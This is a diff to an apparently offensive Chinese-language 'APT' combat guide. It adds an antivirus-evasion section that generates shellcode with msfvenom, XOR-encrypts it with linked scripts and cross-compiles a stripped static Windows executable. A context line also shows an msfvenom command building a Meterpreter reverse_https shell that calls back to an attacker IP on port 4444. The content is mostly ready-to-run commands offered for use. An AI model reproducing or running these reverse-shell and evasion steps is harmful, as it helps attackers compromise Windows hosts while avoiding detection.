@@ -989,3 +989,18 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.189 LPORT=4444
 [引导Shellcode](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8F%8D%E9%9D%99%E6%80%81/引导Shellcode.cpp)
 
 ## 免杀规避
+
+### XOR加密和解密Shellcode
+
+```bash
+msfvenom -p windows/x64/messagebox TEXT='Hi,I am Xor' TITLE='Ghost Wolf Lab' -f raw -o xor.bin
+```
+
+[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor.cpp)
+
+[xor.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%85%8D%E6%9D%80%E8%A7%84%E9%81%BF/xor.py)
+
+```bash
+python3 xor.py
+x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
+```
